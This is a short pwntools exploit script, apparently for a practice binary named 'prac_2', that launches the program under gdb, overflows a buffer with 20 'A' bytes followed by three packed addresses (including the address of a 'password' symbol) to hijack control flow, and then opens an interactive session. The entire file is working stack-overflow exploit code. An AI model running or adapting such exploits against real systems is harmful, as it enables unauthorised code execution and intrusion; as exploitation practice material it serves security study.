from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

p = process('prac_2')
p.recv()
gdb.attach(p, gdbscript='b *vuln+49')

p.sendline('A'*20+
        p32(0x80484b8) +
        p32(0x804859d) +
        p32(p.elf.symbols['password']))
p.interactive()
